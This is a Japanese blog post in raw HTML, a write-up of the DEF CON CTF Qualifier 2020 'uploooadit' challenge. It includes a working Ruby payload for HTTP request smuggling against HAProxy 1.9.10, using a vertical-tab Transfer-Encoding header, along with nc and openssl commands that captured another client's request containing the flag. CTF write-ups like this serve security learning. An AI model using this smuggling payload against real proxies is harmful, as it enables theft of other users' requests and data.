<!DOCTYPE HTML>

<html>
    <head>
        
            
                <title>DEF CON CTF Qualifier 2020 uploooadit WriteUp</title>
            
        

        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="generator" content="Hugo 0.76.0-DEV" />
        


        
            <meta name="author" content="Satoshi Tajima">
        
        
            
                <meta name="description" content="s_tajima::TechBlog">
            
        

        
        

        <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp"/>
<meta name="twitter:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up"/>
<meta name="twitter:site" content="@s_tajima"/>

        <meta property="og:title" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp" />
<meta property="og:description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/" />
<meta property="article:published_time" content="2020-05-18T23:00:00+09:00" />
<meta property="article:modified_time" content="2020-05-18T23:00:00+09:00" />

        <meta itemprop="name" content="DEF CON CTF Qualifier 2020 uploooadit WriteUp">
<meta itemprop="description" content="2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、 welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。 最初の2つはチュートリアルなので割愛して、up">
<meta itemprop="datePublished" content="2020-05-18T23:00:00+09:00" />
<meta itemprop="dateModified" content="2020-05-18T23:00:00+09:00" />
<meta itemprop="wordCount" content="1256">



<meta itemprop="keywords" content="" />

        

        

        
        
            
        

        
        
            <link rel="stylesheet" href="/css/google-font.css" />
            <link rel="stylesheet" href="/css/font-awesome.min.css" />
            <link rel="stylesheet" href="/css/main.css" />
            <link rel="stylesheet" href="/css/add-on.css" />
            <link rel="stylesheet" href="/css/monokai-sublime.css">
        

        
            
                
            
                
                    <link rel="stylesheet" href="/css/custom.css" />
                
            
        

        
        
        
            
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-22927498-5', 'auto');
	
	ga('send', 'pageview');
}
</script>

        
    </head>
    <body>

        
        <div id="wrapper">

    
    
<header id="header">
    
        <h2><a href="/">s_tajima::TechBlog</i></a></h2>
    

    <nav class="links">
        <ul>
            
                <li>
                    <a href="/about">
                        
                            <i class="fa fa-user">&nbsp;</i>About
                    </a>
                </li>
            
        </ul>
    </nav>
    <nav class="main">
        <ul>
            
            <li id="share-nav" class="share-menu" style="display:none;">
                <a class="fa-share-alt" href="#share-menu">Share</a>
            </li>
            
            <li class="search">
                <a class="fa-search" href="#search">Search</a>
                <form id="search" method="get" action="//google.com/search">
                    <input type="text" name="q" placeholder="Search" />
                    <input type="hidden" name="q" value="site:https://blog.s-tajima.work/">
                </form>
            </li>
            <li class="menu">
                <a class="fa-bars" href="#menu">Menu</a>
            </li>
        </ul>
    </nav>
</header>


<section id="menu">

    
        <section>
            <form class="search" method="get" action="//google.com/search">
                <input type="text" name="q" placeholder="Search" />
                <input type="hidden" name="q" value="site:https://blog.s-tajima.work/">
            </form>
        </section>

    
        <section>
            <ul class="links">
                
                    <li>
                        <a href="/about">
                            <h3>
                                
                                    <i class="fa fa-user">&nbsp;</i>
                                
                                About
                            </h3>
                        </a>
                    </li>
                
            </ul>
        </section>

    
        <section>
            <ul class="links">
                <header>
                    <h3>Recent Posts</h3>
                </header>
                
                    
                

                
                    <li>
                        <a href="https://blog.s-tajima.work/post/2020/input-output/"><p>2020年のインプット・アウトプットまとめ</p></a>
                    </li>
                
                    <li>
                        <a href="https://blog.s-tajima.work/post/"><p>Posts</p></a>
                    </li>
                
                    <li>
                        <a href="https://blog.s-tajima.work/post/2020/isucon10-final-hz46/"><p>ISUCON10本選に参加して4位(KLab賞)でした - 一口坂46</p></a>
                    </li>
                
                    <li>
                        <a href="https://blog.s-tajima.work/post/2020/nspv/"><p>GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</p></a>
                    </li>
                
                    <li>
                        <a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/"><p>DEF CON CTF Qualifier 2020 uploooadit WriteUp</p></a>
                    </li>
                
            </ul>
        </section>

    
        
</section>

    <section id="share-menu">
    <section id="social-share-nav">
        <ul class="links">
            <header>
                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
            </header>
            


<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
    <i class="fa fa-twitter"></i>
    <p>Twitter</p>
</a></li>


<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
    <i class="fa fa-google-plus"></i>
    <p>Google+</p>
</a></li>


<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
    <i class="fa fa-facebook"></i>
    <p>Facebook</p>
</a></li>


<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
    <i class="fa fa-reddit-alien"></i>
    <p>Reddit</p>
</a></li>


<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
    <i class="fa fa-linkedin"></i>
    <p>LinkedIn</p>
</a></li>


<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
    <i class="fa fa-stumbleupon"></i>
    <p>StumbleUpon</p>
</a></li>


<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
    <i class="fa fa-envelope"></i>
    <p>Email</p>
</a></li>

        </ul>
    </section>
</section>

    
    <div id="main">
        
        
        <article class="post">
    <header>
    <div class="title">
        
            <h1><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h1>
            
        
        
    </div>
    <div class="meta">
        
            
        

        <time class="published"
            datetime='2020-05-18'>
            May 18, 2020</time>
        <span class="author">Satoshi Tajima</span>
        
        
    </div>
</header>


    

    <div id="content">
        <p>2020/05/16 ~ 2020/05/18 に開催されたDEF CON CTF Qualifier 2020に参加して、<br>
welcome-to-dc2020-quals, welcome-video, uploooaditの3問をときました。</p>
<p>最初の2つはチュートリアルなので割愛して、uploooaditのWriteUpを書きます。</p>
<h1 id="ソースコードを確認">ソースコードを確認</h1>
<ul>
<li>Flaskで書かれたPythonのWebアプリケーション</li>
<li>エンドポイントは以下の3つ
<ul>
<li>GET / &hellip; 空のページです。</li>
<li>POST /files/ &hellip; X-guidというリクエストヘッダに記載された文字列の通りのパスにファイルを保存します。</li>
<li>GET /files/ &hellip; POST /files/ でアップロードしたファイルのコンテンツを返します。</li>
</ul>
</li>
</ul>
<h1 id="稼働環境を確認">稼働環境を確認</h1>
<p>普通にリクエストを投げてみて、HAProxy + gunicorn/20.0.0の構成ということがわかります。</p>
<pre><code>$ curl -sv https://uploooadit.oooverflow.io/
.. snip ..
&lt; HTTP/1.1 204 NO CONTENT
&lt; Server: gunicorn/20.0.0
&lt; Date: Sat, 16 May 2020 13:05:18 GMT
&lt; Content-Type: text/html; charset=utf-8
&lt; Via: haproxy
.. snip ..
</code></pre><p>今度はエラーになるようなリクエストを投げてみて、HAProxyのバージョンは1.9.10ということがわかります。<br>
<a href="https://www.haproxy.org/download/1.9/src/CHANGELOG">https://www.haproxy.org/download/1.9/src/CHANGELOG</a> を見ると、2019/08/08のリリースと若干古いのが気になります。</p>
<pre><code>$ curl -sv https://uploooadit.oooverflow.io/あ
&lt; HTTP/1.0 400 Bad request
&lt; Server: haproxy 1.9.10
&lt; Cache-Control: no-cache
&lt; Connection: close
&lt; Content-Type: text/html
&lt;
&lt;html&gt;&lt;body&gt;&lt;h1&gt;400 Bad request&lt;/h1&gt;
Your browser sent an invalid request.
&lt;/body&gt;&lt;/html&gt;
.. snip ..
</code></pre><p>SSRFやHTTP request smugglingあたりができるのではと疑い、
調べてみると HAProxy の HTTP request smuggling というそのまんまの記事が見つかります。</p>
<ul>
<li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">https://nathandavison.com/blog/haproxy-http-request-smuggling</a></li>
<li><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></li>
</ul>
<p>この時点でこんな仮説をたてました。</p>
<ul>
<li>フラグが含まれたObjectに対するアクセス、ないしはフラグをアップロードするアクセスが、定常的にリクエストされている。</li>
<li>HTTP request smugglingによって、そのアクセスの内容を盗み取る必要がある。</li>
</ul>
<h1 id="ローカルで検証環境の作成">ローカルで検証環境の作成</h1>
<p>適当に立ち上げたEC2上に&hellip;</p>
<ul>
<li>HAProxyの1.9.10を用意 (ソースコードからコンパイル)</li>
<li>gunicornを用意 (pipでインストール)</li>
<li>提供された app.py, store.py を使用 (S3StoreはLocalStoreに切り替え)</li>
</ul>
<p>という形で環境をつくります。</p>
<p>そして、まずはRubyでこんなPayloadを作成。</p>
<ul>
<li>payload.rb</li>
</ul>
<pre><code>payload = &lt;&lt;EOP
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111112\r
Content-Type: text/plain\r
Content-Length: 4\r
\r
test\r

EOP
print payload 
</code></pre><p>こんな形でトライ&amp; エラーを繰り返せる状態を作ります。</p>
<pre><code>$ ruby payload.rb | nc localhost 1080
</code></pre><p>tcpdumpも使い、パケットを見ながら調整していくと、こんな形でうまくいきそうなことがわかります。</p>
<ul>
<li>payload.rb</li>
</ul>
<pre><code>payload = &lt;&lt;EOP.chomp
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111112\r
Content-Type: text/plain\r
Content-Length: 158\r
Transfer-Encoding: \x0bchunked\r
\r
0\r
\r
POST /files/ HTTP/1.1\r
Host: uploooadit.oooverflow.io\r
X-guid: 11111111-2222-3333-1111-111111111119\r
Content-Type: text/plain\r
Content-Length: 388\r
\r
test
EOP

print payload 
sleep(10)
</code></pre><ul>
<li>コマンド</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ unbuffer ruby payload.rb | nc localhost <span style="color:#ae81ff">1080</span>
$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
</code></pre></div><h1 id="実環境でのトライ">実環境でのトライ</h1>
<p>実際の環境はhttpsなので、ncをopenssl s_clientにし、かつ Content-Length も調整していき&hellip;<br>
最終的に以下のようなコマンドにてリクエストを盗み見ることに成功。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ unbuffer ruby payload.rb | openssl s_client -connect uploooadit.oooverflow.io:443
$ curl http://localhost:1080/files/11111111-2222-3333-1111-111111111119
</code></pre></div><p>リクエストのBodyにFLAGがありました。</p>
<pre><code>tesPOST /files/ HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: invoker
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: text/plain
X-guid: 85a290de-9877-4d90-82ea-fe0700a570b0
Content-Length: 152
X-Forwarded-For: 127.0.0.1

Congratulations!
OOO{That girl thinks she's the queen of the neighborhood/She's got the hottest trike in town/That girl, she holds her head up so high}
</code></pre><p>以上、久しぶりに参加したCTFのWriteUpでした。<br>
いつもCTFは遊び参加で数問見てみて終わりみたいになるんだけど、<br>
そろそろチームとか組んでがっつり時間確保して上位に入るのを目指すような参加をしたい。</p>

    </div>

    <footer>
        <ul class="stats">
    
        

        
        
            <li>
                
                
                    

                    
                        Categories
                    
                
            </li>
        
    

    
    
        <li><a href='/categories/ja'>ja</a></li>
    
        <li><a href='/categories/'></a></li>
    
</ul>

    </footer>

    <section id="social-share">
        <ul class="icons">
            


<li><a href="//twitter.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&text=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp&via=s_tajima" target="_blank" class="share-btn twitter">
    <i class="fa fa-twitter"></i>
    <p>Twitter</p>
</a></li>


<li><a href="//plus.google.com/share?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn google-plus">
    <i class="fa fa-google-plus"></i>
    <p>Google+</p>
</a></li>


<li><a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn facebook">
    <i class="fa fa-facebook"></i>
    <p>Facebook</p>
</a></li>


<li><a href="//reddit.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn reddit">
    <i class="fa fa-reddit-alien"></i>
    <p>Reddit</p>
</a></li>


<li><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn linkedin">
    <i class="fa fa-linkedin"></i>
    <p>LinkedIn</p>
</a></li>


<li><a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f&title=DEF%20CON%20CTF%20Qualifier%202020%20uploooadit%20WriteUp" target="_blank" class="share-btn stumbleupon">
    <i class="fa fa-stumbleupon"></i>
    <p>StumbleUpon</p>
</a></li>


<li><a href="mailto:?subject=Check out this post by Satoshi%20Tajima&body=https%3a%2f%2fblog.s-tajima.work%2fpost%2f2020%2fdc28-quals-uploooadit-write-up%2f" target="_blank" class="share-btn email">
    <i class="fa fa-envelope"></i>
    <p>Email</p>
</a></li>

        </ul>
    </section>
</article>
<ul class="actions pagination">
    
        <li><a href="https://blog.s-tajima.work/post/2019/input-output/"
                class="button big previous">2019年のインプット・アウトプットまとめ</a></li>
    

    
        <li><a href="https://blog.s-tajima.work/post/2020/nspv/"
                class="button big next">GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</a></li>
    
</ul>




    </div>
    
<section id="sidebar">

    
        <section id="intro">
            
            
            
                <header>
                    <h2></h2>
                    <p>Tech blog, written by infrastructure/security engineer work in Chiyoda-Ku.</p>
                </header>
            
            <ul class="icons">
                
                
                    
<li><a href="//github.com/s-tajima" target="_blank" title="GitHub" class="fa fa-github"></a></li>

















































<li><a href="//twitter.com/s_tajima" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>




                
            </ul>
        </section>

    
        <section id="recent-posts">
            <ul class="posts">
                <header>
                    <h3>Recent Posts</h3>
                </header>
                
                    
                

                
                    
                

                
                    <li>
                        <article>
                            <header>
                                <h3><a href="https://blog.s-tajima.work/post/2020/input-output/">2020年のインプット・アウトプットまとめ</a></h3>
                                
                                    
                                
                                <time class="published" datetime=
                                    '2020-12-30'>
                                    December 30, 2020</time>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <h3><a href="https://blog.s-tajima.work/post/">Posts</a></h3>
                                
                                    
                                
                                <time class="published" datetime=
                                    '2020-12-30'>
                                    December 30, 2020</time>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <h3><a href="https://blog.s-tajima.work/post/2020/isucon10-final-hz46/">ISUCON10本選に参加して4位(KLab賞)でした - 一口坂46</a></h3>
                                
                                    
                                
                                <time class="published" datetime=
                                    '2020-10-05'>
                                    October 5, 2020</time>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <h3><a href="https://blog.s-tajima.work/post/2020/nspv/">GoでNIST SP 800-63Bに則ったPassword Validatorを作りました</a></h3>
                                
                                    
                                
                                <time class="published" datetime=
                                    '2020-07-05'>
                                    July 5, 2020</time>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <h3><a href="https://blog.s-tajima.work/post/2020/dc28-quals-uploooadit-write-up/">DEF CON CTF Qualifier 2020 uploooadit WriteUp</a></h3>
                                
                                    
                                
                                <time class="published" datetime=
                                    '2020-05-18'>
                                    May 18, 2020</time>
                            </header>
                        </article>
                    </li>
                

                
                    <li>
                        <ul class="actions">
                            <li><a href=
                            
                                /post/
                            
                            class="button">View more posts</a></li>
                        </ul>
                    </li>
                
            </ul>
        </section>

    
    
    
    
        <section id="categories">
            <ul class="posts">
                <header>
                    <h3><a href="/categories/">Categories</a></h3>
                </header>

                
                    
                

                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/aws/">aws</a>
                                <span style="float:right;">2</span>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/en/">en</a>
                                <span style="float:right;">2</span>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/ja/">ja</a>
                                <span style="float:right;">15</span>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/ldap/">ldap</a>
                                <span style="float:right;">1</span>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/security/">security</a>
                                <span style="float:right;">2</span>
                            </header>
                        </article>
                    </li>
                
                    <li>
                        <article>
                            <header>
                                <a href="/categories/tools/">tools</a>
                                <span style="float:right;">3</span>
                            </header>
                        </article>
                    </li>
                
            </ul>
        </section>
    

    
        
        <section class="blurb">
            <h2>About</h2>
            <p>Written by Satoshi Tajima. I&#39;m a infrastructure/security engineer, work in Chiyoda-Ku.</p>

            <ul class="actions">
                <li><a href="/about/" class="button">Learn More</a></li>
            </ul>
        </section>
        

    
        <section id="footer">
            <ul class="icons">
                
                
            </ul>

            <p class="copyright">&copy; s_tajima::TechBlog. Design: <a href="http://html5up.net" target="_blank">HTML5 UP</a>. Ported by <a href="//github.com/jpescador" target="_blank">Julio Pescador</a>. Powered by <a href="//gohugo.io" target="_blank">Hugo</a></p>
        </section>

</section>

            </div>
        <a id="back-to-top" href="#" class="fa fa-arrow-up fa-border fa-2x"></a>
        

        
        
            
        

        
        
            <script src="/js/jquery.min.js"></script>
            <script src="/js/skel.min.js"></script>
            <script src="/js/util.js"></script>
            <script src="/js/main.js"></script>
            <script src="/js/backToTop.js"></script>
            <script src="/js/highlight.pack.js"></script>
        

        

            
            <script>hljs.initHighlightingOnLoad();</script>
            
    </body>
</html>

